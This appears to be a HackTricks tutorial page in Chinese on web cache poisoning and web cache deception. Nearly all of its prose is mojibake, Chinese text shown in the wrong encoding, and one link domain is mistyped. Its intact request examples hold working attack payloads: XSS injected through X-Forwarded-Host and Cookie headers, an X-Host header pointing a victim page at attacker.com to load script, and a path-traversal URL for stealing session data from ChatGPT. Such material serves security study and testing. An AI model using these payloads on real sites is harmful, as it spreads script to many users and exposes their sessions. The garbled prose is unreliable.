# ç¼“å­˜æ¯’åŒ–å’Œç¼“å­˜æ¬ºéª—

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨ä¸–ç•Œä¸Š**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## åŒºåˆ«

> **Webç¼“å­˜æ¯’åŒ–å’ŒWebç¼“å­˜æ¬ºéª—æœ‰ä½•åŒºåˆ«ï¼Ÿ**
>
> * åœ¨**Webç¼“å­˜æ¯’åŒ–**ä¸­ï¼Œæ”»å‡»è€…å¯¼è‡´åº”ç”¨ç¨‹åºåœ¨ç¼“å­˜ä¸­å­˜å‚¨ä¸€äº›æ¶æ„å†…å®¹ï¼Œå¹¶ä¸”è¿™äº›å†…å®¹ä»ç¼“å­˜ä¸­æä¾›ç»™å…¶ä»–åº”ç”¨ç¨‹åºç”¨æˆ·ã€‚
> * åœ¨**Webç¼“å­˜æ¬ºéª—**ä¸­ï¼Œæ”»å‡»è€…å¯¼è‡´åº”ç”¨ç¨‹åºåœ¨ç¼“å­˜ä¸­å­˜å‚¨å±äºå¦ä¸€ä¸ªç”¨æˆ·çš„ä¸€äº›æ•æ„Ÿå†…å®¹ï¼Œç„¶åæ”»å‡»è€…ä»ç¼“å­˜ä¸­æ£€ç´¢è¿™äº›å†…å®¹ã€‚

## ç¼“å­˜æ¯’åŒ–

ç¼“å­˜æ¯’åŒ–æ—¨åœ¨æ“çºµå®¢æˆ·ç«¯ç¼“å­˜ï¼Œä»¥å¼ºåˆ¶å®¢æˆ·ç«¯åŠ è½½æ„å¤–ã€éƒ¨åˆ†æˆ–å—æ”»å‡»è€…æ§åˆ¶çš„èµ„æºã€‚å—å½±å“é¡µé¢çš„æµè¡Œç¨‹åº¦å†³å®šäº†å½±å“çš„ç¨‹åº¦ï¼Œå› ä¸ºå—æ±¡æŸ“çš„å“åº”ä»…æä¾›ç»™åœ¨ç¼“å­˜æ±¡æŸ“æœŸé—´è®¿é—®é¡µé¢çš„ç”¨æˆ·ã€‚

æ‰§è¡Œç¼“å­˜æ¯’åŒ–æ”»å‡»æ¶‰åŠå‡ ä¸ªæ­¥éª¤ï¼š

1. **è¯†åˆ«æ— é”®è¾“å…¥**ï¼šè¿™äº›æ˜¯è™½ç„¶ä¸æ˜¯è¯·æ±‚ç¼“å­˜æ‰€å¿…éœ€çš„å‚æ•°ï¼Œä½†å¯ä»¥æ”¹å˜æœåŠ¡å™¨è¿”å›çš„å“åº”ã€‚è¯†åˆ«è¿™äº›è¾“å…¥è‡³å…³é‡è¦ï¼Œå› ä¸ºå®ƒä»¬å¯ä»¥è¢«åˆ©ç”¨æ¥æ“çºµç¼“å­˜ã€‚
2. **åˆ©ç”¨æ— é”®è¾“å…¥**ï¼šåœ¨è¯†åˆ«æ— é”®è¾“å…¥åï¼Œä¸‹ä¸€æ­¥æ¶‰åŠå¼„æ¸…å¦‚ä½•æ»¥ç”¨è¿™äº›å‚æ•°ï¼Œä»¥ä½¿æœåŠ¡å™¨çš„å“åº”ä»¥æœ‰åˆ©äºæ”»å‡»è€…çš„æ–¹å¼è¿›è¡Œä¿®æ”¹ã€‚
3. **ç¡®ä¿æ¯’åŒ–å“åº”è¢«ç¼“å­˜**ï¼šæœ€åä¸€æ­¥æ˜¯ç¡®ä¿æ“çºµçš„å“åº”å­˜å‚¨åœ¨ç¼“å­˜ä¸­ã€‚è¿™æ ·ï¼Œä»»ä½•åœ¨ç¼“å­˜è¢«æ¯’åŒ–æ—¶è®¿é—®å—å½±å“é¡µé¢çš„ç”¨æˆ·éƒ½å°†æ”¶åˆ°å—æ±¡æŸ“çš„å“åº”ã€‚

### å‘ç°ï¼šæ£€æŸ¥HTTPå¤´

é€šå¸¸ï¼Œå½“å“åº”è¢«**å­˜å‚¨åœ¨ç¼“å­˜ä¸­**æ—¶ï¼Œä¼šæœ‰ä¸€ä¸ª**æŒ‡ç¤ºçš„å¤´éƒ¨**ï¼Œæ‚¨å¯ä»¥åœ¨æ­¤å¸–å­ä¸­æŸ¥çœ‹åº”è¯¥æ³¨æ„çš„å¤´éƒ¨ï¼š[**HTTPç¼“å­˜å¤´éƒ¨**](../network-services-pentesting/pentesting-web/special-http-headers.md#cache-headers)ã€‚

### å‘ç°ï¼šç¼“å­˜400çŠ¶æ€ç 

å¦‚æœæ‚¨è®¤ä¸ºå“åº”è¢«å­˜å‚¨åœ¨ç¼“å­˜ä¸­ï¼Œå¯ä»¥å°è¯•**å‘é€å¸¦æœ‰é”™è¯¯å¤´éƒ¨çš„è¯·æ±‚**ï¼Œåº”è¯¥ä¼šæ”¶åˆ°**çŠ¶æ€ç 400**çš„å“åº”ã€‚ç„¶åå°è¯•æ­£å¸¸è®¿é—®è¯·æ±‚ï¼Œå¦‚æœ**å“åº”æ˜¯400çŠ¶æ€ç **ï¼Œåˆ™è¡¨ç¤ºå­˜åœ¨æ¼æ´ï¼ˆç”šè‡³å¯ä»¥æ‰§è¡ŒDoSæ”»å‡»ï¼‰ã€‚\
ä¸€ä¸ªé…ç½®ä¸å½“çš„å¤´éƒ¨å¯èƒ½åªæ˜¯`\:`ä½œä¸ºå¤´éƒ¨ã€‚\
_è¯·æ³¨æ„ï¼Œæœ‰æ—¶è¿™äº›ç±»å‹çš„çŠ¶æ€ç ä¸ä¼šè¢«ç¼“å­˜ï¼Œå› æ­¤æ­¤æµ‹è¯•å°†æ— æ•ˆã€‚_

### å‘ç°ï¼šè¯†åˆ«å’Œè¯„ä¼°æ— é”®è¾“å…¥

æ‚¨å¯ä»¥ä½¿ç”¨[**Param Miner**](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943)æ¥**æš´åŠ›ç ´è§£å¯èƒ½ä¼šæ”¹å˜é¡µé¢å“åº”çš„å‚æ•°å’Œå¤´éƒ¨**ã€‚ä¾‹å¦‚ï¼Œé¡µé¢å¯èƒ½æ­£åœ¨ä½¿ç”¨å¤´éƒ¨`X-Forwarded-For`æ¥æŒ‡ç¤ºå®¢æˆ·ç«¯ä»é‚£é‡ŒåŠ è½½è„šæœ¬ï¼š
```markup
<script type="text/javascript" src="//<X-Forwarded-For_value>/resources/js/tracking.js"></script>
```
### å¼•å‘åç«¯æœåŠ¡å™¨çš„æœ‰å®³å“åº”

é€šè¿‡è¯†åˆ«çš„å‚æ•°/æ ‡å¤´ï¼Œæ£€æŸ¥å®ƒæ˜¯å¦‚ä½•è¢«**æ¸…ç†**ä»¥åŠå®ƒæ˜¯å¦‚ä½•**è¢«åæ˜ **æˆ–å½±å“æ ‡å¤´å“åº”çš„ã€‚æ‚¨èƒ½å¦ä»¥ä»»ä½•æ–¹å¼æ»¥ç”¨å®ƒï¼ˆæ‰§è¡Œ XSS æˆ–åŠ è½½ç”±æ‚¨æ§åˆ¶çš„ JS ä»£ç ï¼Ÿæ‰§è¡Œ DoSï¼Ÿ...ï¼‰

### è·å–å“åº”ç¼“å­˜

ä¸€æ—¦æ‚¨**ç¡®å®š**äº†å¯ä»¥æ»¥ç”¨çš„**é¡µé¢**ï¼Œè¦ä½¿ç”¨çš„**å‚æ•°**/**æ ‡å¤´**ä»¥åŠå¦‚ä½•**æ»¥ç”¨**å®ƒï¼Œæ‚¨éœ€è¦å°†é¡µé¢ç¼“å­˜ã€‚å–å†³äºæ‚¨å°è¯•ç¼“å­˜çš„èµ„æºï¼Œè¿™å¯èƒ½éœ€è¦ä¸€äº›æ—¶é—´ï¼Œæ‚¨å¯èƒ½éœ€è¦å°è¯•å‡ ç§’é’Ÿã€‚\
å“åº”ä¸­çš„æ ‡å¤´ **`X-Cache`** å¯èƒ½éå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå½“è¯·æ±‚æœªè¢«ç¼“å­˜æ—¶ï¼Œå®ƒå¯èƒ½å…·æœ‰å€¼ **`miss`**ï¼Œè€Œå½“å®ƒè¢«ç¼“å­˜æ—¶åˆ™ä¸º **`hit`**ã€‚\
æ ‡å¤´ **`Cache-Control`** ä¹Ÿå¾ˆæœ‰è¶£ï¼Œå¯ä»¥çŸ¥é“èµ„æºæ˜¯å¦è¢«ç¼“å­˜ï¼Œä¸‹æ¬¡èµ„æºå°†å†æ¬¡è¢«ç¼“å­˜çš„æ—¶é—´æ˜¯ä»€ä¹ˆæ—¶å€™ï¼š`Cache-Control: public, max-age=1800`\
å¦ä¸€ä¸ªæœ‰è¶£çš„æ ‡å¤´æ˜¯ **`Vary`**ã€‚æ­¤æ ‡å¤´é€šå¸¸ç”¨äº**æŒ‡ç¤ºå…¶ä»–æ ‡å¤´**ï¼Œå³ä½¿å®ƒä»¬é€šå¸¸ä¸æ˜¯å…³é”®çš„ï¼Œä¹Ÿä¼šè¢«è§†ä¸º**ç¼“å­˜é”®**çš„ä¸€éƒ¨åˆ†ã€‚å› æ­¤ï¼Œå¦‚æœç”¨æˆ·çŸ¥é“å—å®³è€…çš„ `User-Agent`ï¼Œä»–å¯ä»¥ä¸ºä½¿ç”¨è¯¥ç‰¹å®š `User-Agent` çš„ç”¨æˆ·æ¯’å®³ç¼“å­˜ã€‚\
ä¸ç¼“å­˜ç›¸å…³çš„å¦ä¸€ä¸ªæ ‡å¤´æ˜¯ **`Age`**ã€‚å®ƒå®šä¹‰äº†å¯¹è±¡åœ¨ä»£ç†ç¼“å­˜ä¸­å­˜åœ¨çš„ç§’æ•°ã€‚

åœ¨ç¼“å­˜è¯·æ±‚æ—¶ï¼Œè¦**å°å¿ƒä½¿ç”¨æ ‡å¤´**ï¼Œå› ä¸ºå…¶ä¸­ä¸€äº›å¯èƒ½ä¼š**æ„å¤–ä½¿ç”¨**ä¸º**å…³é”®**ï¼Œå—å®³è€…å°†éœ€è¦ä½¿ç”¨ç›¸åŒçš„æ ‡å¤´ã€‚å§‹ç»ˆä½¿ç”¨**ä¸åŒçš„æµè§ˆå™¨**æµ‹è¯•ç¼“å­˜æŠ•æ¯’ä»¥æ£€æŸ¥æ˜¯å¦æœ‰æ•ˆã€‚

## åˆ©ç”¨ç¤ºä¾‹

### æœ€ç®€å•çš„ç¤ºä¾‹

åƒ `X-Forwarded-For` è¿™æ ·çš„æ ‡å¤´åœ¨å“åº”ä¸­æœªç»è¿‡æ¸…ç†åœ°åæ˜ å‡ºæ¥ã€‚\
æ‚¨å¯ä»¥å‘é€åŸºæœ¬çš„ XSS è´Ÿè½½å¹¶æ¯’å®³ç¼“å­˜ï¼Œå› æ­¤æ¯ä¸ªè®¿é—®è¯¥é¡µé¢çš„äººéƒ½å°†å—åˆ° XSS æ”»å‡»ï¼š
```markup
GET /en?region=uk HTTP/1.1
Host: innocent-website.com
X-Forwarded-Host: a."><script>alert(1)</script>"
```
### ä½¿ç”¨Webç¼“å­˜æ¬ºéª—æ¥åˆ©ç”¨å¤„ç†Cookieçš„æ¼æ´

Cookieä¹Ÿå¯èƒ½ä¼šåœ¨é¡µé¢çš„å“åº”ä¸­åæ˜ å‡ºæ¥ã€‚å¦‚æœæ‚¨å¯ä»¥æ»¥ç”¨å®ƒæ¥å¼•å‘è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œé‚£ä¹ˆæ‚¨å¯èƒ½èƒ½å¤Ÿåˆ©ç”¨æ¶æ„ç¼“å­˜å“åº”ä¸­åŠ è½½çš„å¤šä¸ªå®¢æˆ·ç«¯ä¸­çš„XSSã€‚
```markup
GET / HTTP/1.1
Host: vulnerable.com
Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
```
### åˆ©ç”¨è·¯å¾„éå†è¿›è¡Œç¼“å­˜æ¬ºéª—ä»¥çªƒå– API å¯†é’¥ <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

[**è¿™ç¯‡æ–‡ç« è§£é‡Šäº†**](https://nokline.github.io/bugbounty/2024/02/04/ChatGPT-ATO.html) å¦‚ä½•é€šè¿‡ç±»ä¼¼ `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` çš„ URL æ¥çªƒå– OpenAI API å¯†é’¥ï¼Œå› ä¸ºä»»ä½•åŒ¹é… `/share/*` çš„å†…å®¹éƒ½ä¼šè¢«ç¼“å­˜ï¼Œè€Œ Cloudflare åœ¨è¯·æ±‚åˆ°è¾¾ Web æœåŠ¡å™¨æ—¶å¹¶æœªå¯¹ URL è¿›è¡Œè§„èŒƒåŒ–ã€‚

### åˆ©ç”¨å¤šä¸ªæ ‡å¤´æ¥åˆ©ç”¨ Web ç¼“å­˜æ¬ºéª—æ¼æ´ <a href="#using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities" id="using-multiple-headers-to-exploit-web-cache-poisoning-vulnerabilities"></a>

æœ‰æ—¶ï¼Œæ‚¨éœ€è¦**åˆ©ç”¨å¤šä¸ªæœªåŠ å¯†çš„è¾“å…¥**æ¥æ»¥ç”¨ç¼“å­˜ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ‚¨å°† `X-Forwarded-Host` è®¾ç½®ä¸ºæ‚¨æ§åˆ¶çš„åŸŸï¼Œå¹¶å°† `X-Forwarded-Scheme` è®¾ç½®ä¸º `http`ï¼Œ**å¦‚æœ**æœåŠ¡å™¨å°†æ‰€æœ‰**HTTP**è¯·æ±‚**è½¬å‘åˆ° HTTPS**ï¼Œå¹¶ä½¿ç”¨æ ‡å¤´ `X-Forwarded-Scheme` ä½œä¸ºé‡å®šå‘çš„åŸŸåï¼Œæ‚¨å¯ä»¥é€šè¿‡é‡å®šå‘æ§åˆ¶é¡µé¢æŒ‡å‘çš„ä½ç½®ã€‚
```markup
GET /resources/js/tracking.js HTTP/1.1
Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
X-Forwarded-Scheme: http
```
### åˆ©ç”¨æœ‰é™çš„ `Vary` å¤´éƒ¨

å¦‚æœä½ å‘ç° **`X-Host`** å¤´éƒ¨è¢«ç”¨ä½œ**åŸŸåæ¥åŠ è½½ä¸€ä¸ªJSèµ„æº**ï¼Œä½†å“åº”ä¸­çš„ **`Vary`** å¤´éƒ¨æŒ‡ç¤ºäº† **`User-Agent`**ã€‚é‚£ä¹ˆï¼Œä½ éœ€è¦æ‰¾åˆ°ä¸€ç§æ–¹æ³•æ¥çªƒå–å—å®³è€…çš„ç”¨æˆ·ä»£ç†ï¼Œå¹¶ä½¿ç”¨è¯¥ç”¨æˆ·ä»£ç†æ¥æ“çºµç¼“å­˜ï¼š
```markup
GET / HTTP/1.1
Host: vulnerbale.net
User-Agent: THE SPECIAL USER-AGENT OF THE VICTIM
X-Host: attacker.com
```
### åˆ©ç”¨ HTTP è¯·æ±‚ä¸²æ”¹è¿›è¡Œ HTTP ç¼“å­˜æŠ•æ¯’æ”»å‡»

äº†è§£å¦‚ä½•é€šè¿‡æ»¥ç”¨ [HTTP è¯·æ±‚ä¸²æ”¹è¿›è¡Œç¼“å­˜æŠ•æ¯’æ”»å‡»](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-poisoning)ã€‚

### Web ç¼“å­˜æŠ•æ¯’çš„è‡ªåŠ¨åŒ–æµ‹è¯•

[Web ç¼“å­˜æ¼æ´æ‰«æå™¨](https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner)å¯ç”¨äºè‡ªåŠ¨æµ‹è¯• Web ç¼“å­˜æŠ•æ¯’ã€‚å®ƒæ”¯æŒè®¸å¤šä¸åŒçš„æŠ€æœ¯ï¼Œå¹¶ä¸”é«˜åº¦å¯å®šåˆ¶åŒ–ã€‚

ç¤ºä¾‹ç”¨æ³•ï¼š`wcvs -u example.com`

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨ [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) è½»æ¾æ„å»ºå¹¶ **è‡ªåŠ¨åŒ–** ä½¿ç”¨å…¨çƒ **æœ€å…ˆè¿›** çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## å¯è¢«æ”»å‡»çš„ç¤ºä¾‹

### Apache Traffic Server ([CVE-2021-27577](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27577))

ATS è½¬å‘äº† URL ä¸­çš„ç‰‡æ®µè€Œæ²¡æœ‰å‰¥ç¦»å®ƒï¼Œå¹¶ä¸”ä»…ä½¿ç”¨ä¸»æœºã€è·¯å¾„å’ŒæŸ¥è¯¢ç”Ÿæˆç¼“å­˜å¯†é’¥ï¼ˆå¿½ç•¥ç‰‡æ®µï¼‰ã€‚å› æ­¤ï¼Œè¯·æ±‚ `/#/../?r=javascript:alert(1)` è¢«å‘é€åˆ°åç«¯ä½œä¸º `/#/../?r=javascript:alert(1)`ï¼Œç¼“å­˜å¯†é’¥ä¸­ä¸åŒ…å«æœ‰æ•ˆè½½è·ï¼Œåªæœ‰ä¸»æœºã€è·¯å¾„å’ŒæŸ¥è¯¢ã€‚

### GitHub CP-DoS

åœ¨å†…å®¹ç±»å‹æ ‡å¤´ä¸­å‘é€é”™è¯¯å€¼ä¼šè§¦å‘ 405 ç¼“å­˜å“åº”ã€‚ç¼“å­˜å¯†é’¥åŒ…å«äº† cookieï¼Œå› æ­¤åªèƒ½æ”»å‡»æœªç»æˆæƒçš„ç”¨æˆ·ã€‚

### GitLab + GCP CP-DoS

GitLab ä½¿ç”¨ GCP å­˜å‚¨é™æ€å†…å®¹ã€‚**GCP å­˜å‚¨æ¡¶** æ”¯æŒ **å¤´éƒ¨ `x-http-method-override`**ã€‚å› æ­¤ï¼Œå¯ä»¥å‘é€å¤´éƒ¨ `x-http-method-override: HEAD` å¹¶æŠ•æ¯’ç¼“å­˜ä»¥è¿”å›ç©ºå“åº”ä¸»ä½“ã€‚å®ƒè¿˜å¯ä»¥æ”¯æŒæ–¹æ³• `PURGE`ã€‚

### Rack Middlewareï¼ˆRuby on Railsï¼‰

åœ¨ Ruby on Rails åº”ç”¨ç¨‹åºä¸­ï¼Œç»å¸¸ä½¿ç”¨ Rack ä¸­é—´ä»¶ã€‚Rack ä»£ç çš„ç›®çš„æ˜¯è·å– **`x-forwarded-scheme`** æ ‡å¤´çš„å€¼å¹¶å°†å…¶è®¾ç½®ä¸ºè¯·æ±‚çš„æ–¹æ¡ˆã€‚å½“å‘é€æ ‡å¤´ `x-forwarded-scheme: http` æ—¶ï¼Œä¼šå‘ç”Ÿåˆ°ç›¸åŒä½ç½®çš„ 301 é‡å®šå‘ï¼Œå¯èƒ½å¯¼è‡´å¯¹è¯¥èµ„æºçš„æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚æ­¤å¤–ï¼Œåº”ç”¨ç¨‹åºå¯èƒ½ä¼šè¯†åˆ« `X-forwarded-host` æ ‡å¤´å¹¶å°†ç”¨æˆ·é‡å®šå‘åˆ°æŒ‡å®šçš„ä¸»æœºã€‚è¿™ç§è¡Œä¸ºå¯èƒ½å¯¼è‡´ä»æ”»å‡»è€…æœåŠ¡å™¨åŠ è½½ JavaScript æ–‡ä»¶ï¼Œå­˜åœ¨å®‰å…¨é£é™©ã€‚

### 403 å’Œå­˜å‚¨æ¡¶

Cloudflare ä»¥å‰ç¼“å­˜ 403 å“åº”ã€‚å°è¯•ä½¿ç”¨ä¸æ­£ç¡®çš„æˆæƒæ ‡å¤´è®¿é—® S3 æˆ– Azure å­˜å‚¨ Blob ä¼šå¯¼è‡´ç¼“å­˜çš„ 403 å“åº”ã€‚å°½ç®¡ Cloudflare å·²åœæ­¢ç¼“å­˜ 403 å“åº”ï¼Œä½†è¿™ç§è¡Œä¸ºå¯èƒ½ä»å­˜åœ¨äºå…¶ä»–ä»£ç†æœåŠ¡ä¸­ã€‚

### æ³¨å…¥é”®å‚æ•°

ç¼“å­˜é€šå¸¸åœ¨ç¼“å­˜å¯†é’¥ä¸­åŒ…å«ç‰¹å®šçš„ GET å‚æ•°ã€‚ä¾‹å¦‚ï¼ŒFastly çš„ Varnish åœ¨è¯·æ±‚ä¸­ç¼“å­˜äº† `size` å‚æ•°ã€‚ä½†æ˜¯ï¼Œå¦‚æœè¿˜ä½¿ç”¨äº†å‚æ•°çš„ URL ç¼–ç ç‰ˆæœ¬ï¼ˆä¾‹å¦‚ï¼Œ`siz%65`ï¼‰å¹¶é™¦å…¥äº†é”™è¯¯å€¼ï¼Œç¼“å­˜å¯†é’¥å°†ä½¿ç”¨æ­£ç¡®çš„ `size` å‚æ•°æ„å»ºã€‚ç„¶è€Œï¼Œåç«¯ä¼šå¤„ç† URL ç¼–ç å‚æ•°ä¸­çš„å€¼ã€‚å¯¹ç¬¬äºŒä¸ª `size` å‚æ•°è¿›è¡Œ URL ç¼–ç ä¼šå¯¼è‡´ç¼“å­˜ä¸­çœç•¥è¯¥å‚æ•°ï¼Œä½†åç«¯ä¼šä½¿ç”¨å®ƒã€‚å°†æ­¤å‚æ•°èµ‹å€¼ä¸º 0 ä¼šå¯¼è‡´å¯ç¼“å­˜çš„ 400 Bad Request é”™è¯¯ã€‚

### ç”¨æˆ·ä»£ç†è§„åˆ™

ä¸€äº›å¼€å‘äººå‘˜ä¼šé˜»æ­¢ä¸é«˜æµé‡å·¥å…·ï¼ˆå¦‚ FFUF æˆ– Nucleiï¼‰åŒ¹é…çš„ç”¨æˆ·ä»£ç†çš„è¯·æ±‚ï¼Œä»¥ç®¡ç†æœåŠ¡å™¨è´Ÿè½½ã€‚å…·æœ‰è®½åˆºæ„å‘³çš„æ˜¯ï¼Œè¿™ç§æ–¹æ³•å¯èƒ½ä¼šå¼•å…¥ç¼“å­˜æŠ•æ¯’å’Œ DoS ç­‰æ¼æ´ã€‚

### éæ³•æ ‡å¤´å­—æ®µ

[RFC7230](https://datatracker.ietf.mrg/doc/html/rfc7230) æŒ‡å®šäº†æ ‡å¤´åç§°ä¸­å¯æ¥å—çš„å­—ç¬¦ã€‚æ ‡å¤´åŒ…å«è¶…å‡ºæŒ‡å®š **tchar** èŒƒå›´çš„å­—ç¬¦åº”è¯¥ç†æƒ³æƒ…å†µä¸‹è§¦å‘ 400 Bad Request å“åº”ã€‚å®é™…ä¸Šï¼ŒæœåŠ¡å™¨å¹¶ä¸æ€»æ˜¯éµå¾ªè¿™ä¸€æ ‡å‡†ã€‚ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„ä¾‹å­æ˜¯ Akamaiï¼Œå®ƒä¼šè½¬å‘å¸¦æœ‰æ— æ•ˆå­—ç¬¦çš„æ ‡å¤´å¹¶ç¼“å­˜ä»»ä½• 400 é”™è¯¯ï¼Œåªè¦ä¸å­˜åœ¨ `cache-control` æ ‡å¤´ã€‚å‘ç°äº†ä¸€ä¸ªå¯åˆ©ç”¨çš„æ¨¡å¼ï¼Œå‘é€å¸¦æœ‰éæ³•å­—ç¬¦çš„æ ‡å¤´ï¼Œä¾‹å¦‚ `\`ï¼Œä¼šå¯¼è‡´å¯ç¼“å­˜çš„ 400 Bad Request é”™è¯¯ã€‚

### æŸ¥æ‰¾æ–°æ ‡å¤´

[https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6](https://gist.github.com/iustin24/92a5ba76ee436c85716f003dda8eecc6)

## ç¼“å­˜æ¬ºéª—

ç¼“å­˜æ¬ºéª—çš„ç›®æ ‡æ˜¯ä½¿å®¢æˆ·ç«¯**åŠ è½½å°†ç”±ç¼“å­˜ä¿å­˜çš„èµ„æºåŠå…¶æ•æ„Ÿä¿¡æ¯**ã€‚

é¦–å…ˆè¯·æ³¨æ„ï¼Œä¾‹å¦‚ `.css`ã€`.js`ã€`.png` ç­‰**æ‰©å±•å**é€šå¸¸è¢«**é…ç½®**ä¸º**ä¿å­˜**åœ¨**ç¼“å­˜ä¸­**ã€‚å› æ­¤ï¼Œå¦‚æœè®¿é—® `www.example.com/profile.php/nonexistent.js`ï¼Œç¼“å­˜å¯èƒ½ä¼šå­˜å‚¨å“åº”ï¼Œå› ä¸ºå®ƒçœ‹åˆ°äº† `.js` **æ‰©å±•å**ã€‚ä½†æ˜¯ï¼Œå¦‚æœ**åº”ç”¨ç¨‹åº**æ­£åœ¨**é‡æ”¾**å­˜å‚¨åœ¨ _www.example.com/profile.php_ ä¸­çš„**æ•æ„Ÿ**ç”¨æˆ·å†…å®¹ï¼Œæ‚¨å¯ä»¥ä»å…¶ä»–ç”¨æˆ·é‚£é‡Œ**çªƒå–**è¿™äº›å†…å®¹ã€‚

å…¶ä»–è¦æµ‹è¯•çš„å†…å®¹ï¼š

* _www.example.com/profile.php/.js_
* _www.example.com/profile.php/.css_
* _www.example.com/profile.php/test.js_
* _www.example.com/profile.php/../test.js_
* _www.example.com/profile.php/%2e%2e/test.js_
* _ä½¿ç”¨è¾ƒå°‘äººçŸ¥é“çš„æ‰©å±•åï¼Œå¦‚_ `.avif`

å¦ä¸€ä¸ªéå¸¸æ˜æ˜¾çš„ä¾‹å­å¯ä»¥åœ¨è¿™ç¯‡æ–‡ç« ä¸­æ‰¾åˆ°ï¼š[https://hackerone.com/reports/593712](https://hackerone.com/reports/593712)ã€‚\
åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œè§£é‡Šäº†å¦‚æœåŠ è½½ä¸€ä¸ªä¸å­˜åœ¨çš„é¡µé¢ï¼Œå¦‚ _http://www.example.com/home.php/non-existent.css_ï¼Œå°†è¿”å› _http://www.example.com/home.php_ çš„å†…å®¹ï¼ˆ**å¸¦æœ‰ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯**ï¼‰ï¼Œå¹¶ä¸”ç¼“å­˜æœåŠ¡å™¨å°†ä¿å­˜ç»“æœã€‚\
ç„¶åï¼Œ**æ”»å‡»è€…**å¯ä»¥åœ¨è‡ªå·±çš„æµè§ˆå™¨ä¸­è®¿é—® _http://www.example.com/home.php/non-existent.css_ å¹¶è§‚å¯Ÿä¹‹å‰è®¿é—®è¿‡çš„ç”¨æˆ·çš„**æœºå¯†ä¿¡æ¯**ã€‚

è¯·æ³¨æ„ï¼Œ**ç¼“å­˜ä»£ç†**åº”è¯¥æ ¹æ®æ–‡ä»¶çš„æ‰©å±•åï¼ˆ_.css_ï¼‰è€Œä¸æ˜¯æ ¹æ®å†…å®¹ç±»å‹æ¥**é…ç½®**ç¼“å­˜æ–‡ä»¶ã€‚åœ¨ç¤ºä¾‹ä¸­ï¼Œ_http://www.example.com/home.php/non-existent.css_ å°†å…·æœ‰ `text/html` å†…å®¹ç±»å‹ï¼Œè€Œä¸æ˜¯é¢„æœŸçš„ `text/css` MIME ç±»å‹ï¼ˆè¿™æ˜¯ _.css_ æ–‡ä»¶çš„é¢„æœŸç±»å‹ï¼‰ã€‚

äº†è§£å¦‚ä½•é€šè¿‡[æ»¥ç”¨ HTTP è¯·æ±‚ä¸²æ”¹è¿›è¡Œç¼“å­˜æ¬ºéª—æ”»å‡»](http-request-smuggling/#using-http-request-smuggling-to-perform-web-cache-deception)ã€‚

## è‡ªåŠ¨åŒ–å·¥å…·

